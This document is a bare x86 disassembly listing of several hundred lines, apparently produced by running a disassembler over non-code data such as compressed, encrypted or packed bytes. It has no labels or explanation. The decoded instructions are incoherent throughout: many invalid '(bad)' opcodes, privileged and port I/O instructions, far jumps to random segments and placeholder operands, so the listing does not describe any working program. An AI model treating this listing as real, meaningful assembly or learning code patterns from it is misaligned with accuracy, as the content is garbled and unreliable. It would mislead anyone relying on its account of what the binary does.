  4261d8:	dec    esi
  4261d9:	(bad)  
  4261da:	xor    esi,eax
  4261dc:	je     0x42620f
  4261de:	pop    esp
  4261df:	push   esi
  4261e0:	fwait
  4261e1:	mov    ?,ecx
  4261e3:	add    dh,BYTE PTR [edx+0x7329215f]
  4261e9:	sub    al,0xb0
  4261eb:	cs jl  0x4261ee
	...
  426256:	fwait
  426257:	and    DWORD PTR [edi],ecx
  426259:	popa   
  42625a:	mov    edi,0xb7fbff6f
  42625f:	xor    DWORD PTR [ecx-0x620b11d9],0x15
  426266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426267:	cwde   
  426268:	add    DWORD PTR [eax],eax
  42626a:	inc    DWORD PTR [eax]
  42626c:	add    BYTE PTR [eax],al
  42626e:	adc    BYTE PTR [esi-0x38],dh
  426271:	dec    edx
  426272:	dec    ecx
  426273:	adc    dl,bh
  426275:	dec    edi
  426276:	xlat   BYTE PTR ds:[ebx]
  426277:	mov    al,0x5c
  426279:	les    ebx,FWORD PTR [edi-0x5607f1b1]
  42627f:	in     al,dx
  426280:	mov    ebp,0x29d9e859
  426285:	adc    BYTE PTR [ecx],ah
  426287:	add    al,0x36
  426289:	sbb    BYTE PTR [ebx],0x8e
  42628c:	outs   dx,DWORD PTR ds:[esi]
  42628d:	mov    esi,0x76f1f2cf
  426292:	in     al,dx
  426293:	lods   eax,DWORD PTR ds:[esi]
  426294:	mov    dx,0x200f
  426298:	xchg   ebx,eax
  426299:	(bad)  
  42629a:	jae    0x42629a
  42629c:	push   ecx
  42629d:	push   esp
  42629e:	inc    esi
  42629f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a0:	int    0x3e
  4262a2:	push   cs
  4262a3:	mov    ds:0xabca33df,eax
  4262a8:	fcomp  QWORD PTR [edx+0x3b]
  4262ab:	ss pop ss
  4262ad:	mov    esp,eax
  4262af:	cmp    ch,BYTE PTR [ebx+0x0]
  4262b2:	outs   dx,BYTE PTR ds:[esi]
  4262b3:	hlt    
  4262b4:	lods   al,BYTE PTR ds:[esi]
  4262b5:	and    eax,0xe587ba2
  4262ba:	pusha  
  4262bb:	(bad)  
  4262bc:	jmp    0xd460755e
  4262c1:	or     eax,0xbd9aacbe
  4262c6:	inc    ecx
  4262c7:	jp     0x426285
  4262c9:	jo     0x4262cc
  4262cb:	jmp    0x92fa:0x6a22d84f
  4262d2:	inc    eax
  4262d3:	or     al,0xbe
  4262d5:	inc    BYTE PTR [esi-0x65272cb8]
  4262db:	out    dx,al
  4262dc:	push   esp
  4262dd:	and    bl,BYTE PTR [ebx-0x4fc460bc]
  4262e3:	and    al,BYTE PTR [ecx-0x73]
  4262e6:	loope  0x4262ef
  4262e8:	mov    edi,0xf13ec327
  4262ed:	sbb    ebp,ecx
  4262ef:	cmp    DWORD PTR [edi+0x30],0x240c8730
  4262f6:	cmp    ebx,DWORD PTR [eax+0x18]
  4262f9:	pop    ebp
  4262fa:	fs adc al,0xde
  4262fd:	and    eax,0x433f0ea3
  426302:	imul   ebx,ecx,0x470da453
  426308:	out    0xa9,eax
  42630a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42630b:	addr16 int 0x37
  42630e:	push   0xffffff97
  426310:	lds    eax,FWORD PTR [eax-0x51]
  426313:	mov    al,ds:0x5c39f1ab
  426318:	popa   
  426319:	xchg   BYTE PTR [edi],bh
  42631b:	push   ebx
  42631c:	inc    ebx
  42631d:	mov    ch,0x28
  42631f:	aaa    
  426320:	(bad)  
  426321:	sub    edx,DWORD PTR [esp+edx*1+0x403ce67e]
  426328:	push   esi
  426329:	dec    ebp
  42632a:	in     eax,dx
  42632b:	mov    cl,0xe9
  42632d:	mov    ah,0xe7
  42632f:	sbb    eax,0xa91a842
  426334:	inc    eax
  426335:	add    dh,BYTE PTR [ebx]
  426337:	jnp    0x426350
  426339:	(bad)  
  42633a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42633b:	outs   dx,DWORD PTR ss:[esi]
  42633d:	and    BYTE PTR [esi-0x4f04235b],bh
  426343:	pop    ds
  426344:	and    cl,BYTE PTR [eax+0x61c5963]
  42634a:	std    
  42634b:	sti    
  42634c:	sub    dl,ch
  42634e:	jno    0x42631e
  426350:	sub    eax,0xc38d60a8
  426355:	add    BYTE PTR [bx+0x74],0x27
  42635a:	sub    BYTE PTR [ecx],al
  42635c:	cli    
  42635d:	or     esi,esi
  42635f:	add    eax,0xeda46070
  426364:	mov    WORD PTR [edi],?
  426366:	or     BYTE PTR [edx+0x33b9171],ch
  42636c:	mov    BYTE PTR [eax],al
	...
  4263d6:	push   esp
  4263d7:	and    eax,0xeefd4e8d
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0x67c1a342
  4263e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263e7:	cdq    
  4263e8:	add    DWORD PTR [eax],eax
  4263ea:	inc    DWORD PTR [eax]
  4263ec:	add    BYTE PTR [eax],al
  4263ee:	clc    
  4263ef:	lea    esp,[esi+edi*8+0x52]
  4263f3:	fwait
  4263f4:	ror    BYTE PTR [ebp+0x18fc8fa5],cl
  4263fa:	jo     0x42645b
  4263fc:	daa    
  4263fd:	nop
  4263fe:	bound  ebx,QWORD PTR [edx-0x69]
  426401:	push   ss
  426402:	mov    BYTE PTR [ebp+esi*2+0x48],ch
  426406:	pop    esi
  426407:	xchg   ebx,eax
  426408:	test   ecx,esi
  42640a:	outs   dx,DWORD PTR ds:[esi]
  42640b:	adc    dh,BYTE PTR [ecx]
  42640d:	cmp    DWORD PTR [ebx-0x2629c4cb],ebx
  426413:	sbb    BYTE PTR [eax],0xa6
  426416:	adc    al,0x70
  426418:	(bad)  [ebx+0x6b]
  42641b:	mov    ds,WORD PTR [edx-0x6f70f788]
  426421:	(bad)  
  426422:	xchg   edi,eax
  426423:	xchg   esi,eax
  426424:	test   BYTE PTR [ebx-0x2a879ad6],bh
  42642a:	sbb    BYTE PTR [ecx-0x66],al
  42642d:	test   DWORD PTR [eax-0x20],edx
  426430:	push   edi
  426431:	jb     0x426416
  426433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426434:	test   BYTE PTR [edi-0x20],ch
  426437:	mov    esi,0x33a82d55
  42643c:	mov    cl,0xb7
  42643e:	push   0xd4637f6d
  426443:	div    ebp
  426445:	mov    eax,ds:0xb75217e6
  42644a:	push   edx
  42644b:	inc    eax
  42644c:	cdq    
  42644d:	cmp    al,0x41
  42644f:	shl    DWORD PTR [edx-0x6e7c3335],0x9b
  426456:	daa    
  426457:	sbb    al,0x36
  426459:	icebp  
  42645a:	push   edx
  42645b:	sti    
  42645c:	sbb    ebp,DWORD PTR [edi]
  42645e:	jne    0x4264de
  426460:	hlt    
  426461:	xor    eax,edi
  426463:	rol    DWORD PTR [eax-0x25],0x33
  426467:	pop    esi
  426468:	add    al,0x57
  42646a:	pop    ds
  42646b:	ret    0x77d5
  42646e:	test   bh,bh
  426470:	mov    ch,0x49
  426472:	std    
  426473:	sbb    ebp,ebx
  426475:	call   FWORD PTR [ecx-0x4d]
  426478:	mov    cl,0xad
  42647a:	sbb    esp,DWORD PTR [ebp+0x5a]
  42647d:	(bad)
  426480:	pusha  
  426481:	sti    
  426482:	sbb    DWORD PTR [ebx],eax
  426484:	(bad)  
  426485:	inc    ebp
  426486:	xchg   ebx,eax
  426487:	jo     0x426437
  426489:	jnp    0x4264c6
  42648b:	stos   DWORD PTR es:[edi],eax
  42648c:	lods   al,BYTE PTR ds:[esi]
  42648d:	rcr    BYTE PTR [esi],0x9b
  426490:	into   
  426491:	rcl    BYTE PTR [edx+0x15],0x18
  426495:	repz cmp ebx,DWORD PTR [ebx]
  426498:	jns    0x42641c
  42649a:	lods   eax,DWORD PTR ds:[esi]
  42649b:	xchg   ebx,eax
  42649c:	mov    ebx,0xe7a7ab8
  4264a1:	outs   dx,DWORD PTR ds:[esi]
  4264a2:	add    DWORD PTR [eax],ebp
  4264a4:	pop    ebx
  4264a5:	das    
  4264a6:	in     eax,0x66
  4264a8:	call   0xb6ea:0xba4b115a
  4264af:	push   0xd9d4d7b9
  4264b4:	xchg   esp,eax
  4264b5:	cli    
  4264b6:	loope  0x426457
  4264b8:	out    dx,al
  4264b9:	outs   dx,BYTE PTR ds:[esi]
  4264ba:	xchg   ecx,eax
  4264bb:	inc    ebp
  4264bc:	xor    ebx,ebx
  4264be:	lods   al,BYTE PTR ds:[esi]
  4264bf:	cs add BYTE PTR es:[ebp+eiz*4+0x5e53469e],ch
  4264c8:	push   ss
  4264c9:	push   cs
  4264ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264cb:	sub    BYTE PTR [ecx+0x2559ce31],bh
  4264d1:	pop    edx
  4264d2:	mov    edx,DWORD PTR [esi]
  4264d4:	add    esp,DWORD PTR ss:[eax-0x51b1abde]
  4264db:	dec    ebp
  4264dc:	(bad)  
  4264dd:	inc    BYTE PTR [eax]
  4264df:	dec    eax
  4264e0:	mov    cl,0x3b
  4264e2:	sub    DWORD PTR ds:0xb592e113,ebp
  4264e8:	jnp    0x42651e
  4264ea:	aad    0x4e
  4264ec:	aad    0x0
	...
  426556:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42655d:	outs   dx,DWORD PTR ds:[esi]
  42655e:	vmwrite ecx,DWORD PTR [edx+0x5f1b3885]
  426565:	mov    fs,WORD PTR [ebx-0xfffe66]
  42656b:	add    BYTE PTR [eax],al
  42656d:	add    BYTE PTR [ebp+eax*8-0x560ce036],cl
  426574:	lods   al,BYTE PTR ds:[esi]
  426575:	and    ebp,DWORD PTR [edx-0x18298333]
  42657b:	jbe    0x426589
  42657d:	mov    dh,0x10
  42657f:	clc    
  426580:	jge    0x426599
  426582:	and    DWORD PTR [ecx+eax*1+0x4c5c85f9],esp
  426589:	dec    esp
  42658a:	jmp    0x6f5f:0xd4584a69
  426591:	popa   
  426592:	test   DWORD PTR [ebp+0xfbc296e],edi
  426598:	leave  
  426599:	push   0x36
  42659b:	fdiv   DWORD PTR ds:0x49e8d3d1
  4265a1:	fcmovne st,st(5)
  4265a3:	aam    0xbf
  4265a5:	dec    edi
  4265a6:	popa   
  4265a7:	add    BYTE PTR [ebx-0x47],ch
  4265aa:	mov    esp,0xc1302a2e
  4265af:	xchg   DWORD PTR ds:0xb0eb0f6e,edx
  4265b5:	push   0x80873ed8
  4265ba:	inc    edx
  4265bb:	test   al,0xe0
  4265bd:	pop    es
  4265be:	mov    esp,0xdebcffee
  4265c3:	pop    edi
  4265c4:	jmp    0x20be3175
  4265c9:	out    dx,al
  4265ca:	call   0x1312:0xbe4d73f5
  4265d1:	adc    al,BYTE PTR [ecx+0x3072318a]
  4265d7:	and    al,0xec
  4265d9:	repnz cmp DWORD PTR [edi],edi
  4265dc:	mov    eax,ds:0x49b50c2d
  4265e1:	enter  0xf55d,0xf2
  4265e5:	fcom   DWORD PTR [eax]
  4265e7:	sbb    al,0x35
  4265e9:	shl    BYTE PTR [esi-0x3bf012ef],0xa7
  4265f0:	mov    ecx,?
  4265f2:	outs   dx,DWORD PTR ds:[esi]
  4265f3:	jge    0x426589
  4265f5:	mov    al,ds:0xb5eeb9ca
  4265fa:	loope  0x42660f
  4265fc:	sbb    DWORD PTR [edi-0x3674df1f],ebp
  426602:	arpl   WORD PTR [ebx-0x67],cx
  426605:	shl    DWORD PTR [edi-0x77],1
  426608:	lds    esi,FWORD PTR [ebp+0x58f0b30e]
  42660e:	pop    eax
  42660f:	fs (bad) 
  426611:	mov    edx,0xd05c3bde
  426616:	lods   al,BYTE PTR ds:[esi]
  426617:	xor    BYTE PTR [eax-0x7e],bh
  42661a:	out    0x26,al
  42661c:	pop    edi
  42661d:	imul   ebx,eax,0x24
  426620:	imul   edx,ebx,0x77
  426623:	pop    eax
  426624:	push   ecx
  426625:	cmc    
  426626:	add    BYTE PTR [ebx-0x17ee52d8],dh
  42662c:	xor    eax,0xfd5018d1
  426631:	mov    bl,0xff
  426633:	cmp    DWORD PTR [esi+edx*2-0x18],0x33
  426638:	mov    ds:0x61b86de,eax
  42663d:	fcom   QWORD PTR [eax+edi*8+0x24275a1b]
  426644:	std    
  426645:	xchg   DWORD PTR [ebp+0x63],esp
  426648:	sbb    ecx,ebp
  42664a:	imul   esi,edi,0x56f76701
  426650:	dec    edi
  426651:	shl    BYTE PTR [ebx],1
  426653:	xchg   esp,eax
  426654:	in     al,dx
  426655:	cmp    BYTE PTR [ebx+0x13],ch
  426658:	cmp    BYTE PTR [esi-0x2a],dl
  42665b:	mov    esi,DWORD PTR [ebp-0x7b]
  42665e:	stos   BYTE PTR es:[edi],al
  42665f:	add    dl,al
  426661:	dec    ecx
  426662:	mov    dh,0xc4
  426664:	fdivr  st(4),st
  426666:	sbb    bh,bh
  426668:	ds stos BYTE PTR es:[edi],al
  42666a:	cld    
  42666b:	dec    esi
  42666c:	retf   0x0
	...
  4266d3:	add    BYTE PTR [eax],al
  4266d5:	add    BYTE PTR [edx],dl
  4266d7:	retf   
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi-0x6561925c]
  4266e4:	inc    ebx
  4266e5:	mov    dl,0xa2
  4266e7:	fwait
  4266e8:	add    DWORD PTR [eax],eax
  4266ea:	inc    DWORD PTR [eax]
  4266ec:	add    BYTE PTR [eax],al
  4266ee:	into   
  4266ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266f0:	mov    ch,0x38
  4266f2:	cli    
  4266f3:	pusha  
  4266f4:	mov    cl,0x2f
  4266f6:	in     eax,0x56
  4266f8:	sbb    esi,DWORD PTR [edi+0x7c]
  4266fb:	scas   eax,DWORD PTR es:[edi]
  4266fc:	mov    eax,ds:0x29f65353
  426701:	cmp    edi,DWORD PTR [esi]
  426703:	cmp    al,0xfc
  426705:	xor    DWORD PTR [ecx+0x4d],ebx
  426708:	jne    0x426744
  42670a:	jns    0x4266b5
  42670c:	or     eax,0xb49f3ddb
  426711:	and    al,0x49
  426713:	add    dh,dh
  426715:	and    eax,0x18c40e6f
  42671a:	add    ebx,0xffffffbc
  42671d:	sub    BYTE PTR ds:0x8cb4a75a,dh
  426723:	push   ebp
  426724:	or     eax,0x89484aa0
  426729:	xor    al,0x4e
  42672b:	jns    0x426798
  42672d:	test   DWORD PTR [ebp+0x4d],ebx
  426730:	inc    BYTE PTR [ecx-0x68]
  426733:	icebp  
  426734:	cmc    
  426735:	arpl   WORD PTR [ebx-0x60],bp
  426738:	xchg   esp,eax
  426739:	dec    esp
  42673a:	out    dx,al
  42673b:	std    
  42673c:	adc    DWORD PTR [esi+0x6a],edx
  42673f:	inc    esi
  426740:	xchg   esp,eax
  426741:	and    BYTE PTR [ebx+0x75],dl
  426744:	add    DWORD PTR [esi-0x58],ecx
  426747:	sbb    DWORD PTR [ebx-0x32],esp
  42674a:	xor    al,0x80
  42674c:	aam    0x49
  42674e:	pop    esp
  42674f:	push   ss
  426750:	xchg   edx,eax
  426751:	or     al,0x7b
  426753:	sbb    ch,BYTE PTR [ebx+0x6c97fa73]
  426759:	mov    al,ds:0x13751de3
  42675e:	xor    al,0xe0
  426760:	jmp    0x8a821d32
  426765:	xchg   DWORD PTR [eax-0x3c],esp
  426768:	nop
  426769:	xchg   esp,eax
  42676a:	mov    edx,ds
  42676c:	push   edi
  42676d:	or     eax,0x697fc3de
  426772:	adc    esp,ebp
  426774:	sbb    edx,DWORD PTR [edi+edx*4-0x13]
  426778:	or     cl,BYTE PTR [edi+0x38]
  42677b:	icebp  
  42677c:	add    ebp,DWORD PTR [ebx+0x21]
  42677f:	xchg   edi,eax
  426780:	retf   0xda7e
  426783:	sub    cl,BYTE PTR [esp+edx*4+0x5a94d545]
  42678a:	adc    BYTE PTR [ebp-0x58],dl
  42678d:	mov    esp,0x60996d4e
  426792:	or     ch,BYTE PTR ss:[ebx+0x73b52c75]
  426799:	lea    edi,[ebp+0x7d]
  42679c:	mov    al,ds:0xd6e5dcfe
  4267a1:	and    bl,0x7c
  4267a4:	jmp    0x45694874
  4267a9:	xor    DWORD PTR [ecx+0x320a3f30],0xffffffee
  4267b0:	add    al,al
  4267b2:	cmc    
  4267b3:	shl    esp,cl
  4267b5:	push   ds
  4267b6:	dec    ebx
  4267b7:	clc    
  4267b8:	out    0x7a,al
  4267ba:	sub    eax,0x84571cec
  4267bf:	sub    BYTE PTR [eax-0x73],al
  4267c2:	jmp    0x4267e5
  4267c4:	or     bh,0x44
  4267c7:	enter  0x8217,0x2a
  4267cb:	dec    eax
  4267cc:	and    esi,edi
  4267ce:	cmp    ecx,DWORD PTR [eax-0x699de61b]
  4267d4:	push   ebx
  4267d5:	(bad)  
  4267d6:	in     al,0x7
  4267d8:	cs and esi,esi
  4267db:	sub    eax,0xf976a2e3
  4267e0:	inc    ecx
  4267e1:	mov    ch,0x3e
  4267e3:	cmp    eax,0xcee919ec
  4267e8:	and    al,0xd5
  4267ea:	sbb    BYTE PTR [eax+0xcf],ch
	...
  426854:	add    BYTE PTR [eax],al
  426856:	mov    eax,0xff2ace8d
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	inc    esi
  426863:	pop    ss
  426864:	ja     0x426828
  426866:	mov    eax,ds:0xff00019c
  42686b:	add    BYTE PTR [eax],al
  42686d:	add    BYTE PTR [eax-0x3f],ch
  426870:	outs   dx,BYTE PTR ds:[esi]
  426871:	loop   0x426817
  426873:	and    DWORD PTR [esi],edi
  426875:	jmp    0x8514:0x679bb3e2
  42687c:	sub    al,0x4c
  42687e:	or     dh,al
  426880:	xchg   dl,cl
  426882:	jne    0x4268a4
  426884:	scas   al,BYTE PTR es:[edi]
  426885:	aam    0x73
  426887:	mov    ds:0x919ca48c,al
  42688c:	fsub   QWORD PTR [ecx]
  42688e:	loopne 0x426834
  426890:	inc    esi
  426891:	cld    
  426892:	xchg   ebx,eax
  426893:	shr    DWORD PTR [esi],0x73
  426896:	adc    eax,0x910bf4b7
  42689b:	pop    esi
  42689c:	push   esp
  42689d:	ins    DWORD PTR es:[edi],dx
  42689e:	cmp    al,0x2e
  4268a0:	aaa    
  4268a1:	xchg   edi,eax
  4268a2:	in     eax,dx
  4268a3:	dec    edx
  4268a4:	shr    BYTE PTR [edx+0x66feff44],cl
  4268aa:	retf   0x48f6
  4268ad:	(bad)  
  4268af:	das    
  4268b0:	es daa 
  4268b2:	xchg   esi,eax
  4268b3:	xchg   esp,eax
  4268b4:	(bad)  ds:0x22a40c5d
  4268ba:	mov    WORD PTR gs:0x9c682c28,fs
  4268c1:	dec    edx
  4268c2:	dec    ebp
  4268c3:	fstp   TBYTE PTR [eax-0x17]
  4268c6:	jns    0x42684b
  4268c8:	cmc    
  4268c9:	dec    esp
  4268ca:	leave  
  4268cb:	push   ebx
  4268cc:	in     al,0x3d
  4268ce:	mov    dh,0x7f
  4268d0:	in     al,0xfb
  4268d2:	into   
  4268d3:	xchg   edx,eax
  4268d4:	retf   0xd16b
  4268d7:	lds    ebp,FWORD PTR [esi-0x6e]
  4268da:	lods   al,BYTE PTR ds:[esi]
  4268db:	cmc    
  4268dc:	adc    DWORD PTR [eax],edx
  4268de:	icebp  
  4268df:	lds    esp,FWORD PTR [ecx+0x66]
  4268e2:	xchg   ecx,eax
  4268e3:	dec    ebx
  4268e4:	repz call 0xf513:0x12ebef94
  4268ec:	fs push ds
  4268ee:	es mov esp,0x4ec16700
  4268f4:	mov    al,0xcb
  4268f6:	iret   
  4268f7:	and    BYTE PTR [edx],al
  4268f9:	cmp    eax,DWORD PTR [eax+edi*8+0x3d730914]
  426900:	pop    edx
  426901:	icebp  
  426902:	xchg   edx,eax
  426903:	jae    0x426978
  426905:	pop    esp
  426906:	sahf   
  426907:	add    esp,DWORD PTR [eax+ebx*1]
  42690a:	mov    ebp,0x83b86a25
  42690f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426910:	jae    0x4268c8
  426912:	out    dx,al
  426913:	stos   BYTE PTR es:[edi],al
  426914:	dec    esi
  426915:	daa    
  426916:	imul   edi,eax,0x2
  426919:	mov    ebp,ecx
  42691b:	ret    0xe32f
  42691e:	popf   
  42691f:	test   al,0x9c
  426921:	out    0x2f,al
  426923:	cli    
  426924:	retf   0x38c4
  426927:	mov    esi,0xbd6e3d18
  42692c:	dec    esp
  42692d:	dec    ebp
  42692e:	lock data16 mov es,WORD PTR ds:0xde719055
  426936:	pop    ds
  426937:	push   0x6f
  426939:	adc    DWORD PTR [ecx+0x22],0xfdaa747e
  426940:	xchg   edi,eax
  426941:	jae    0x426946
  426943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426944:	ds or  edi,ebx
  426947:	cmp    al,0x6b
  426949:	xchg   edi,eax
  42694a:	(bad)  
  42694b:	or     DWORD PTR [edi+0x3963d7e0],eax
  426951:	mov    ebx,0x11f85b19
  426956:	jge    0x42698c
  426958:	scas   al,BYTE PTR es:[edi]
  426959:	data16 sbb BYTE PTR [edi+0x70],cl
  42695d:	xor    dl,ch
  42695f:	and    BYTE PTR [ebx-0x4fa94fe],cl
  426965:	push   0xe76924a2
  42696a:	loope  0x4268f0
  42696c:	adc    eax,0x0
	...
  4269d5:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  4269dc:	mov    edi,?
  4269de:	sub    ebp,esp
  4269e0:	lahf   
  4269e1:	mov    ebx,ebp
  4269e3:	test   BYTE PTR [esi-0x62],ch
  4269e6:	mov    al,ds:0xff00019d
  4269eb:	add    BYTE PTR [eax],al
  4269ed:	add    BYTE PTR [edx],bh
  4269ef:	and    BYTE PTR [edx+ecx*4-0x79],al
  4269f3:	clc    
  4269f4:	shl    ebp,1
  4269f6:	outs   dx,DWORD PTR ds:[esi]
  4269f7:	clc    
  4269f8:	out    0x61,al
  4269fa:	cmp    al,0xe0
  4269fc:	retf   0x97e0
  4269ff:	hlt    
  426a00:	ins    DWORD PTR es:[edi],dx
  426a01:	mov    ds,WORD PTR [eax-0x1a]
  426a04:	xor    edx,ecx
  426a06:	jge    0x426a33
  426a08:	and    eax,0x3e70ad57
  426a0d:	test   DWORD PTR [ebx-0x2f],ecx
  426a10:	pop    ds
  426a11:	sbb    ecx,DWORD PTR [eax]
  426a13:	rcr    edi,1
  426a15:	jle    0x426a8e
  426a17:	sbb    eax,0x3643afb9
  426a1c:	mov    esp,DWORD PTR [ecx]
  426a1e:	jle    0x426a0a
  426a20:	aas    
  426a21:	pop    ds
  426a22:	hlt    
  426a23:	pop    ebp
  426a24:	mov    ebp,0x64cc8f19
  426a29:	pop    ebx
  426a2a:	add    edi,DWORD PTR [edi+0x2bead5e4]
  426a30:	and    eax,0x97e05ed
  426a35:	jns    0x4269d7
  426a37:	cmp    eax,0x4be5ac1f
  426a3c:	or     BYTE PTR [ecx],cl
  426a3e:	in     al,dx
  426a3f:	adc    al,0x58
  426a41:	dec    eax
  426a42:	sbb    eax,0x33a1c564
  426a47:	mov    cl,0x41
  426a49:	bound  edx,QWORD PTR [edx]
  426a4b:	sub    al,0xe1
  426a4d:	inc    ecx
  426a4e:	loop   0x426a09
  426a50:	out    dx,al
  426a51:	xor    DWORD PTR [ecx-0x17],ebx
  426a54:	imul   edx,edi,0x728239b4
  426a5a:	das    
  426a5b:	outs   dx,BYTE PTR ds:[esi]
  426a5c:	enter  0x6785,0xf0
  426a60:	ret    0x5889
  426a63:	loopne 0x426ab5
  426a65:	mov    ch,0xa
  426a67:	(bad)  
  426a68:	cli    
  426a69:	pop    eax
  426a6a:	pop    ecx
  426a6b:	pusha  
  426a6c:	iret   
  426a6d:	jbe    0x426a8c
  426a6f:	mov    dl,0x48
  426a71:	stos   DWORD PTR es:[edi],eax
  426a72:	inc    esp
  426a73:	or     BYTE PTR [edi],bl
  426a75:	into   
  426a76:	pop    ebp
  426a77:	aad    0xe5
  426a79:	cmp    DWORD PTR [edi],ecx
  426a7b:	xchg   ecx,eax
  426a7c:	jnp    0x426a63
  426a7e:	mov    DWORD PTR [edx+0xf651a9b],edi
  426a84:	ja     0x426a37
  426a86:	ja     0x426ae3
  426a88:	fistp  QWORD PTR [ecx]
  426a8a:	cmc    
  426a8b:	push   edx
  426a8c:	xchg   esi,edi
  426a8e:	jl     0x426a67
  426a90:	sbb    bh,ch
  426a92:	inc    edi
  426a93:	mov    eax,0x3bc72753
  426a99:	gs push ebx
  426a9b:	sub    al,0xaf
  426a9d:	(bad)  
  426a9e:	adc    dl,BYTE PTR [ebx-0x2bd000fd]
  426aa4:	loopne 0x426ae3
  426aa6:	sbb    al,0x4b
  426aa8:	jmp    0x426a6a
  426aaa:	mov    eax,0xf3209cb5
  426aaf:	push   edx
  426ab0:	inc    esi
  426ab1:	xlat   BYTE PTR ds:[ebx]
  426ab2:	push   0x4a
  426ab4:	jge    0x426a6e
  426ab6:	in     eax,0xa8
  426ab8:	mov    ah,0xbf
  426aba:	jae    0x426aae
  426abc:	adc    al,0x7a
  426abe:	stc    
  426abf:	mov    dh,0xaa
  426ac1:	or     al,0xbc
  426ac3:	adc    eax,0xb476e4f9
  426ac8:	(bad)  
  426ac9:	stos   BYTE PTR es:[edi],al
  426aca:	mov    dl,0x6c
  426acc:	(bad)  
  426acd:	dec    esp
  426ace:	xchg   DWORD PTR [eax],ebp
  426ad0:	cmc    
  426ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ad2:	ret    0xc365
  426ad5:	mov    cl,0x5c
  426ad7:	or     BYTE PTR [ebx],0xde
  426ada:	in     al,dx
  426adb:	in     al,dx
  426adc:	mov    esp,0x2d38f04b
  426ae1:	or     DWORD PTR [eax],ebx
  426ae3:	inc    edi
  426ae4:	jl     0x426ae9
  426ae6:	out    0x9e,eax
  426ae8:	push   0x3
  426aea:	test   al,0xa6
  426aec:	push   0x0
	...
  426b56:	cdq    
  426b57:	sub    BYTE PTR ds:0xdb77bd56,cl
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0xee
  426b63:	add    eax,0x9e9fc2b9
  426b68:	add    DWORD PTR [eax],eax
  426b6a:	inc    DWORD PTR [eax]
  426b6c:	add    BYTE PTR [eax],al
  426b6e:	mov    esp,ecx
  426b70:	int    0x5f
  426b72:	les    ecx,FWORD PTR [esi]
  426b74:	pop    eax
  426b75:	and    eax,0x83895712
  426b7a:	je     0x426b99
  426b7c:	push   DWORD PTR [ecx-0x77]
  426b7f:	pop    esp
  426b80:	adc    DWORD PTR [edi+0x6c457f3e],0xd39b897
  426b8a:	jge    0x426bb6
  426b8c:	lock rcl DWORD PTR [ebx-0x716b07b],0x4b
  426b94:	lds    edi,FWORD PTR [eax]
  426b96:	cmp    DWORD PTR [ebp+edx*1-0x4],edx
  426b9a:	and    BYTE PTR [eax],dh
  426b9c:	hlt    
  426b9d:	rcl    ebp,cl
  426b9f:	adc    ah,BYTE PTR [ebx-0x74b1d22]
  426ba5:	nop
  426ba6:	xlat   BYTE PTR gs:[ebx]
  426ba8:	inc    ebp
  426ba9:	xchg   edi,eax
  426baa:	xchg   esi,eax
  426bab:	inc    ecx
  426bac:	icebp  
  426bad:	dec    edx
  426bae:	and    ebx,DWORD PTR [eax+0x200451b2]
  426bb4:	out    dx,eax
  426bb5:	jmp    0x426c16
  426bb7:	cld    
  426bb8:	fcomp  QWORD PTR [edi+0x75]
  426bbb:	mov    ds:0x73f46986,eax
  426bc0:	repnz into 
  426bc2:	daa    
  426bc3:	sahf   
  426bc4:	and    dh,BYTE PTR [edi-0x45cba97e]
  426bca:	es add al,0xff
  426bcd:	mov    DWORD PTR [ebx],esp
  426bcf:	and    ah,BYTE PTR [esi-0x3a]
  426bd2:	rcl    edi,0xd0
  426bd5:	int3   
  426bd6:	je     0x426c00
  426bd8:	mov    dh,0xe1
  426bda:	add    al,0xc8
  426bdc:	mov    esi,0xe5942dd0
  426be1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426be2:	inc    ebp
  426be3:	retf   
  426be4:	shl    BYTE PTR [ebx+0x780f34b9],0x43
  426beb:	jge    0x426ba6
  426bed:	mul    DWORD PTR [ebx-0x25b0dd8d]
  426bf3:	and    eax,0x3f3fa2f
  426bf8:	leave  
  426bf9:	mov    esi,0xadad79bd
  426bfe:	stos   DWORD PTR es:[edi],eax
  426bff:	xchg   edi,eax
  426c00:	mov    bl,0x2e
  426c02:	sub    BYTE PTR [ebx-0x26284d12],ah
  426c08:	dec    esi
  426c09:	mov    ?,esp
  426c0b:	pop    eax
  426c0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c0d:	sbb    al,0x47
  426c0f:	xchg   ecx,eax
  426c10:	loop   0x426c48
  426c12:	enter  0x4239,0x55
  426c16:	sbb    edi,esi
  426c18:	mov    DWORD PTR [esi-0x74],ebx
  426c1b:	adc    BYTE PTR [eax+0x338a1d9b],cl
  426c21:	into   
  426c22:	xchg   DWORD PTR [ebx+eiz*1+0x4bb8571c],edx
  426c29:	int    0xbe
  426c2b:	ds adc esp,DWORD PTR gs:[esi+0x15b5d3bf]
  426c33:	pop    ds
  426c34:	jne    0x426c63
  426c36:	mov    bl,0xb3
  426c38:	and    eax,0xf9aa41de
  426c3d:	(bad)  
  426c3e:	push   0xffffffb4
  426c40:	repz pop ss
  426c42:	mov    ds,esp
  426c44:	add    DWORD PTR [edx+0x178f2c64],ebp
  426c4a:	rol    BYTE PTR [ebp+eiz*8+0x777dac58],cl
